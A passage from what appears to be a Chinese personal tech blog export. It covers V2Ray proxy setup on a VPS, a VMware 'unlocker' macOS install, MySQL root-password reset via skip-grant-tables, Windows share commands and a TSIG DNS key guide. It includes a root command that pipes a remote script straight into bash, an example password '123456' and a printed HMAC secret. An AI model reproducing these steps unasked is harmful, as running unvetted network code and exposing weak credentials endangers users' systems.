<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:~# bash &lt;(curl -L -s https://install.direct/go.sh)</span><br><span class="line">Installing V2Ray v4.22.1 on x86_64</span><br><span class="line">Downloading V2Ray: https://github.com/v2ray/v2ray-core/releases/download/v4.22.1/v2ray-linux-64.zip</span><br><span class="line"><span class="meta">  %</span><span class="bash"> Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   608  100   608    0     0   5286      0 --:--:-- --:--:-- --:--:--  5286</span><br><span class="line">100 11.6M  100 11.6M    0     0  17.9M      0 --:--:-- --:--:-- --:--:-- 44.1M</span><br><span class="line">/dev/fd/63: line 144: unzip: command not found</span><br><span class="line">Updating software repo</span><br><span class="line">Installing unzip</span><br><span class="line">Selecting previously unselected package unzip.</span><br><span class="line">(Reading database ... 67022 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../unzip_6.0-21ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking unzip (6.0-21ubuntu1) ...</span><br><span class="line">Setting up unzip (6.0-21ubuntu1) ...</span><br><span class="line">Processing triggers for mime-support (3.60ubuntu1) ...</span><br><span class="line">Processing triggers for man-db (2.8.3-2ubuntu0.1) ...</span><br><span class="line">Archive:  /tmp/v2ray/v2ray.zip</span><br><span class="line">  inflating: /usr/bin/v2ray/geoip.dat</span><br><span class="line">  inflating: /usr/bin/v2ray/geosite.dat</span><br><span class="line">  inflating: /usr/bin/v2ray/v2ctl</span><br><span class="line">  inflating: /usr/bin/v2ray/v2ray</span><br><span class="line">PORT:这是我的PORT[保密]</span><br><span class="line">UUID:这是我的uuid[保密]</span><br><span class="line">Archive:  /tmp/v2ray/v2ray.zip</span><br><span class="line">  inflating: /etc/systemd/system/v2ray.service</span><br><span class="line">Created symlink /etc/systemd/system/multi-user.target.wants/v2ray.service → /etc/systemd/system/v2ray.service.</span><br><span class="line">V2Ray v4.22.1 is installed.</span><br></pre></td></tr></table></figure>

</p>
</details>

<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:~# vi /etc/v2ray/config.json</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx0f3coq2j30nv0idgmq.jpg" alt="image.png"></p>
<h2 id="启动v2ray服务"><a href="#启动v2ray服务" class="headerlink" title="启动v2ray服务"></a>启动v2ray服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@vultr:~# systemctl start v2ray</span><br></pre></td></tr></table></figure>
<h2 id="PC端使用v2ray服务"><a href="#PC端使用v2ray服务" class="headerlink" title="PC端使用v2ray服务"></a>PC端使用v2ray服务</h2><h3 id="下载客户端"><a href="#下载客户端" class="headerlink" title="下载客户端"></a>下载客户端</h3><p>从<a href="https://github.com/v2ray/v2ray-core/releases">官网</a>下载客户端，找到适合自己电脑版本和位数的发行版：（用迅雷下载，速度快）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx104ir3wj31f60u00wb.jpg" alt="image.png"></p>
<h3 id="修改配置文件-1"><a href="#修改配置文件-1" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>解压安装包，修改配置文件<code>config.json</code>。</p>
<details><summary>点击展开配置文件内容</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;log&quot;: &#123;</span><br><span class="line">    &quot;loglevel&quot;: &quot;info&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;inbounds&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;port&quot;: 1080,</span><br><span class="line">      &quot;protocol&quot;: &quot;socks&quot;,</span><br><span class="line">      &quot;sniffing&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: true,</span><br><span class="line">        &quot;destOverride&quot;: [</span><br><span class="line">          &quot;http&quot;,</span><br><span class="line">          &quot;tls&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;udp&quot;: true // 开启 UDP 协议支持</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;port&quot;: 8082, //我用http的8082端口来代理</span><br><span class="line">      &quot;protocol&quot;: &quot;http&quot;,</span><br><span class="line">      &quot;sniffing&quot;: &#123;</span><br><span class="line">        &quot;enabled&quot;: true,</span><br><span class="line">        &quot;destOverride&quot;: [</span><br><span class="line">          &quot;http&quot;,</span><br><span class="line">          &quot;tls&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;outbounds&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;tag&quot;: &quot;proxy-vmess&quot;,</span><br><span class="line">      &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;</span><br><span class="line">        &quot;vnext&quot;: [</span><br><span class="line">          &#123;</span><br><span class="line">            &quot;address&quot;: &quot;我的vps服务器IP[保密]&quot;, // 服务器的 IP</span><br><span class="line">            &quot;port&quot;: 443, // 服务器的端口</span><br><span class="line">            &quot;users&quot;: [</span><br><span class="line">              &#123;</span><br><span class="line">                // id 就是 UUID，相当于用户密码</span><br><span class="line">                &quot;id&quot;: &quot;我的uuid[保密]&quot;,</span><br><span class="line">                &quot;alterId&quot;: 4</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;tag&quot;: &quot;direct&quot;,</span><br><span class="line">      &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">      &quot;protocol&quot;: &quot;freedom&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;dns&quot;: &#123;</span><br><span class="line">    &quot;server&quot;: [</span><br><span class="line">      &quot;8.8.8.8&quot;,</span><br><span class="line">      &quot;1.1.1.1&quot;</span><br><span class="line">    ],</span><br><span class="line">    // 你的 IP 地址，用于 DNS 解析离你最快的 CDN</span><br><span class="line">    &quot;clientIp&quot;: &quot;203.208.40.63&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  // 配置路由功能，绕过局域网和中国大陆地址</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;domainStrategy&quot;: &quot;IPOnDemand&quot;,</span><br><span class="line">    &quot;rules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;domain&quot;: [</span><br><span class="line">          // 默认跳过国内网站，如果想要代理某个国内网站可以添加到下列列表中</span><br><span class="line">          &quot;cnblogs.com&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;proxy-vmess&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;domain&quot;: [</span><br><span class="line">          &quot;geosite:cn&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;direct&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;outboundTag&quot;: &quot;direct&quot;,</span><br><span class="line">        &quot;ip&quot;: [</span><br><span class="line">          &quot;geoip:cn&quot;,</span><br><span class="line">          &quot;geoip:private&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<h3 id="开启客户端"><a href="#开启客户端" class="headerlink" title="开启客户端"></a>开启客户端</h3><p>双击<code>v2ray.exe</code>可以开启客户端，此时有命令行窗口（略碍眼）<br>关闭刚刚打开的命令行窗口，直接双击运行<code>wv2ray.exe</code>，这是静默开启客户端，不会弹出命令行窗口。</p>
<h3 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h3><p>平时我用谷歌浏览器是使用谷歌访问助手代理的，于是我用火狐浏览器测试一下这个v2ray代理是否能够正常用。判断标准就是能不能打开谷歌和油管。<br>浏览器要设置一下代理，代理sock协议127.0.0.1的1080端口。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx86k9ji1j31f60u0whv.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx87hnlgqj31f60u0mzo.jpg" alt="image.png"><br>设置好代理之后，点击proxy。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx88a65vpj31f60u0dif.jpg" alt="image.png"><br>我们打开网页，输入google，可以进入谷歌首页。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx1caxgcgj31f60u0tbj.jpg" alt="image.png"><br>再试试油管能不能上，可以上油管，老高的视频也能看。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcx1djrg37j31f60u01ky.jpg" alt="image.png"></p>
<hr>
<p>不过这个网速不是特别好（可接受，不是飞一般的速度，可以更快）。</p>
<h2 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h2><h3 id="下载安卓客户端"><a href="#下载安卓客户端" class="headerlink" title="下载安卓客户端"></a>下载安卓客户端</h3><p><a href="https://apkpure.com/cn/bifrostv/com.github.dawndiy.bifrostv">下载连接</a><br>这个链接只能在外网环境打开……<br>上面的链接是针对没有谷歌框架的安卓机（我的虽然有，和没有也差不多，没有外网就进不去google play store）,直接使用这个apk安装就行了。如果有谷歌框架的安卓机，可以直接去商店搜索<code>BifrostV</code>下载安装。</p>
<h3 id="配置文件设置"><a href="#配置文件设置" class="headerlink" title="配置文件设置"></a>配置文件设置</h3><p>参考这个<a href="https://blog.seanchao.xyz/2018/08/v2ray-guide">配置</a><br>简单的，容易上手。现在手机也能用了。</p>
<h2 id="配置多用户"><a href="#配置多用户" class="headerlink" title="配置多用户"></a>配置多用户</h2><p>先用命令行<code>/usr/bin/v2ray/v2ctl uuid</code>生成uuid，然后配置文件改成这样：</p>
<details><summary>点击展开配置文件</summary>
<p>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;inbounds&quot;: [&#123;</span><br><span class="line">    &quot;port&quot;: 443,</span><br><span class="line">    &quot;protocol&quot;: &quot;vmess&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;clients&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;本身的uuid&quot;,</span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 64</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;id&quot;: &quot;刚刚生成的uuid&quot;,</span><br><span class="line">          &quot;level&quot;: 1,</span><br><span class="line">          &quot;alterId&quot;: 66</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;outbounds&quot;: [&#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;freedom&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    &quot;protocol&quot;: &quot;blackhole&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;&#125;,</span><br><span class="line">    &quot;tag&quot;: &quot;blocked&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;routing&quot;: &#123;</span><br><span class="line">    &quot;rules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;field&quot;,</span><br><span class="line">        &quot;ip&quot;: [&quot;geoip:private&quot;],</span><br><span class="line">        &quot;outboundTag&quot;: &quot;blocked&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>配置文件修改保存以后，就重启v2ray服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:~# systemctl restart v2ray</span><br></pre></td></tr></table></figure>

<p>用户使用的时候，就在配置文件填写相应的uuid。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnvultr.com/15.html">新人注册赠送100美金的活动介绍</a><br><a href="https://yuan.ga/v2ray-complete-tutorial/">教程</a><br><a href="https://zhuanlan.zhihu.com/p/35779715">vultr的vps服务器修改root密码的方法</a><br><a href="https://github.com/v2ray/v2ray-core/releases">v2ray电脑客户端下载链接</a><br><a href="https://apkpure.com/cn/bifrostv/com.github.dawndiy.bifrostv">安卓下载连接</a><br><a href="https://blog.seanchao.xyz/2018/08/v2ray-guide">BifrostV配置参考</a><br><a href="https://www.hijk.pw/v2ray-multiple-users/">配置多用户生成uuid</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>vps</tag>
        <tag>v2ray</tag>
        <tag>vultr</tag>
      </tags>
  </entry>
  <entry>
    <title>win10+vmware15安装黑苹果</title>
    <url>//posts/ZH-CN/Win10_Vmware15_Install_BlackApple.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>就是想体验一下MacOS系统嘛。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>我们首先要用unlocker这个工具把vmware破解一下，才可以安装苹果的虚拟机。</p>
<h3 id="unlocker破解vmware"><a href="#unlocker破解vmware" class="headerlink" title="unlocker破解vmware"></a>unlocker破解vmware</h3><p><a href="https://github.com/paolo-projects/unlocker/releases">unlocker工具下载链接</a>，选择release的最新版本下载。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcred53pd3j31f60u0gpb.jpg" alt="image.png"><br>关闭vmware相关的服务：（计算机管理——&gt;服务）<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcref76grpj31hc0u0afq.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreehtquuj30y80ol7ao.jpg" alt="image.png"><br>任务管理器关闭vmware的后台进程。<br>关完相关服务和进程之后，右键以管理员权限运行<code>win-install.cmd</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreh7qxloj30sf0j5abp.jpg" alt="image.png"><br>破解过程中，会显示进度条。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcre7p7d8lj30xz0hr400.jpg" alt="image.png"><br>破解成功后，tools文件夹会生成两个iso镜像文件。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreiejzxvj30qi06g3yq.jpg" alt="image.png"></p>
<h3 id="开启vmware"><a href="#开启vmware" class="headerlink" title="开启vmware"></a>开启vmware</h3><p>在开启vmware之前，把vmware相关的服务还原，改为<code>自动</code>状态。<br>开启虚拟机，新建虚拟机，导入黑苹果的cdr镜像。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrel3xsvsj30xb0rjtbt.jpg" alt="image.png"><br>操作步骤：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrem18zt5j30fu0fbab6.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrend5ewkj310p0qh0wj.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreo7jtgjj30fu0fbt91.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreq324l7j30fu0fbwex.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreqi1b34j30fu0fbwes.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreryvaxmj31f60u0n0t.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcresvuvhsj31f60u0dhm.jpg" alt="image.png"></p>
<h3 id="进入MacOS虚拟机之后的配置"><a href="#进入MacOS虚拟机之后的配置" class="headerlink" title="进入MacOS虚拟机之后的配置"></a>进入MacOS虚拟机之后的配置</h3><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrev4a23nj31f60u0dox.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrewz66r5j31f60u0tlk.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrexxhc5bj31f60u0an1.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcreywv10hj31f60u0qd8.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrf0dvhoij31f60u0wml.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrf17ns7dj31f60u0thj.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrf3ifh41j31f60u0k25.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrf5psil2j31f60u04al.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrg27maglj31f60u0n6p.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrg2wau29j31f60u0gud.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrg3kmdbfj31f60u0117.jpg" alt="image.png"><br>注意网络模式要设置为桥接模式。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrirzi3oxj30nw0q375d.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrg4di6p3j31f60u0n65.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrga0dt70j31f60u0dp0.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgalw92gj31f60u0gus.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgb3jcqdj31f60u047u.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgbu006cj31f60u0tj5.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgd8b83lj31f60u0wn6.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgemqa79j31f60u0k0c.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgfg0b4ij31f60u049r.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrggi8rwoj31f60u0q7t.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgh5doxlj31f60u04qp.jpg" alt="image.png"></p>
<h3 id="安装vmtools"><a href="#安装vmtools" class="headerlink" title="安装vmtools"></a>安装vmtools</h3><p>安装vmtools是为了让虚拟机更接近真机，并且方便宿主机和虚拟机互相传文件。<br>关机，添加iso镜像<code>darwinPre15.iso</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgk60il0j31f60u078a.jpg" alt="image.png"><br>重启虚拟机。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgujtyiaj31f60u04qp.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrgv6y3u9j31f60u01kx.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrh0cmbe4j31f60u0qnq.jpg" alt="image.png"><br>vmtools安装失败。看报错信息，应该是unlocker破解出来的镜像证书失效导致的。从<a href="https://blog.csdn.net/qq_36409711/article/details/86530903">网上</a>下载了一个镜像，成功安装vmtools。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrh70xdkmj31f60u0wig.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrhb1blldj31f60u0tu7.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrhgrljduj31f60u0nfy.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcrhoo8i9kj31f60u0nj4.jpg" alt="image.png"><br>终于可以使用苹果系统啦。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcriue5ottj31f60u0qv6.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.youtube.com/watch?v=EmWi_Axy0jw">视频教程</a><br><a href="https://blog.csdn.net/qq_36409711/article/details/86530903">vmtools安装参考文章</a></p>
]]></content>
      <categories>
        <category>黑苹果</category>
      </categories>
      <tags>
        <tag>win10+vmware15</tag>
        <tag>安装黑苹果</tag>
      </tags>
  </entry>
  <entry>
    <title>win10电脑查看CPU、内存、硬盘大小</title>
    <url>//posts/ZH-CN/win10-cpu-memory-disk.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>查看win10电脑的硬件配置信息。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><ul>
<li><p>查看CPU和内存<br>此电脑——&gt;属性<br><a href="https://v2ray.dana5haw.com:8008/image/xYwu"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/07/image.png" alt="image.png"></a></p>
</li>
<li><p>查看硬盘大小<br>参考<a href="http://www.xitongcheng.com/jiaocheng/win10_article_43105.html">文章</a><br>此电脑——&gt;管理——&gt;存储——&gt;磁盘管理</p>
</li>
</ul>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>CPU</tag>
        <tag>内存</tag>
        <tag>硬盘</tag>
        <tag>win10</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10修改mysql密码</title>
    <url>//posts/ZH-CN/windows10-mysql-change-password.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>忘记了mysql的密码，怎么办？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>参考<a href="https://zhuanlan.zhihu.com/p/29843000">文章</a></p>
<ul>
<li>以跳过权限验证的方式启动mysql<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net stop mysql 停止mysql服务</span><br><span class="line">mysqld --defaults-file=&quot;D:\mysql-5.7.28-winx64\bin\my.ini&quot; --console --skip-grant-tables 跳过权限验证启动mysql</span><br></pre></td></tr></table></figure></li>
<li>以跳过权限验证的方式登录mysql并修改root密码<br>开启另一个cmd界面，要求密码输入的地方直接回车<br>mysql -u root -p<br>进入mysql命令行修改root密码：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line">use mysql;</span><br><span class="line">update <span class="keyword">user</span> <span class="keyword">set</span> authentication_string<span class="operator">=</span>password(<span class="string">&#x27;123456&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure>
现在我们就可以使用设置的密码登录mysql了。<br><a href="https://v2ray.dana5haw.com:8008/image/xTUU"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image4546fa98b4df1524.png" alt="image4546fa98b4df1524.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xeI8"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image0f223b003a0dc8e7.png" alt="image0f223b003a0dc8e7.png"></a></li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>windows10</tag>
        <tag>修改mysql密码</tag>
      </tags>
  </entry>
  <entry>
    <title>windows10运行mysql报错</title>
    <url>//posts/ZH-CN/windows10-mysql-start-error.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>windows10安装的mysql数据库，启动报错。<br><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>进入目录<code>D:\mysql-5.7.28-winx64\bin</code>，打开powershell，依次输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqld -remove</span><br><span class="line">mysqld -install</span><br><span class="line">mysqld --initialize</span><br><span class="line">net start mysql</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/x4Tl"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image7e5ec2be7b66eb97.png" alt="image7e5ec2be7b66eb97.png"></a><br>参考<a href="https://yq.aliyun.com/articles/673802">文章</a></p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>windows10</tag>
        <tag>mysql启动报错</tag>
      </tags>
  </entry>
  <entry>
    <title>windows服务进程相关学习</title>
    <url>//posts/ZH-CN/windows-service-process-study.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习windows服务进程相关的内容。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="默认共享"><a href="#默认共享" class="headerlink" title="默认共享"></a>默认共享</h2><ul>
<li>查看默认共享<br>命令：<code>net share</code><br>作用：用于管理共享资源，使网络用户可以使用某一服务器上的资源。当不带选项使用此命令时，它会列出该计算机上正在被共享的所有资源。<br><a href="https://v2ray.dana5haw.com:8008/image/1i6c"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image.png" alt="image.png"></a><br><a href="https://blog.csdn.net/haiross/article/details/12708131">参考</a></li>
<li>关闭默认共享<br>命令：<code>net share 共享名 /delete</code><br>作用：关闭默认共享<br><a href="https://v2ray.dana5haw.com:8008/image/1red"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image390978931d142b68.png" alt="image390978931d142b68.png"></a><br><a href="https://blog.csdn.net/hongkaihua1987/article/details/85703609">参考</a></li>
<li>开启默认共享<br>命令：<code>net share 共享名=资源</code><br>作用：开启默认共享<br><a href="https://v2ray.dana5haw.com:8008/image/17MT"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image35b1e4ae17516420.png" alt="image35b1e4ae17516420.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/1Ull"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/17/image6e13338f17703aca.png" alt="image6e13338f17703aca.png"></a><br><a href="https://www.cnblogs.com/firstdream/p/8384350.html">参考</a></li>
</ul>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows服务进程</tag>
      </tags>
  </entry>
  <entry>
    <title>一的法则观后感-外星人对话</title>
    <url>//posts/ZH-CN/Law_Of_One.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于外星人以及我们所处的宇宙充满了好奇心，《一的法则》是Carla作为媒介，人类与外星人Ra进行的通讯内容记录。虽然中文译本语法的易读性实在太差，也先忍耐。以后有机会再找英文原版来看。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="读后感"><a href="#读后感" class="headerlink" title="读后感"></a>读后感</h2>]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>一的法则</tag>
        <tag>读书笔记</tag>
        <tag>外星智慧</tag>
      </tags>
  </entry>
  <entry>
    <title>使用TISG加密机制增强DNS服务器之间数据传输的安全性</title>
    <url>//posts/ZH-CN/TISG-DNS-master-slave-safe-transfer.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了确保DNS主从服务器之间数据传输的安全性，可使用TISG加密机制传输数据。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="TISG加密机制传输数据"><a href="#TISG加密机制传输数据" class="headerlink" title="TISG加密机制传输数据"></a>TISG加密机制传输数据</h2><p>主服务器：192.168.0.106<br>从服务器：192.168.0.102</p>
<ol>
<li>主服务器配置</li>
</ol>
<ul>
<li>使用dnssec-keygen生成密钥<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">dnssec-keygen -a HMAC-MD5 -b 128 -n HOST master-slave</span><br></pre></td></tr></table></figure>
<div class="note [class]">
            <p>解析：<code>-a</code>参数，指的是加密算法类型。<br><code>-b</code>参数，指的是密钥长度。<br><code>-n</code>参数，指的是密钥类型。<br><code>master-salve</code>是自定义的密钥名称。</p>
          </div>
我们需要用到私钥的key。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image35d6b3e9c4032c01.png" alt="image35d6b3e9c4032c01.png"></li>
<li>编辑密钥传输文件<code>/var/named/chroot/etc/tansfer.key</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key &quot;master-slave&quot; &#123;</span><br><span class="line">algorithm hmac-md5;</span><br><span class="line">secret &quot;1g7++KPRr3ZIbf7szGO2gw==&quot;; #刚刚生成的私钥的key</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<img src="https://v2ray.dana5haw.com:8008/images/2020/07/04/image05527506e3684c3f.png" alt="image05527506e3684c3f.png"></li>
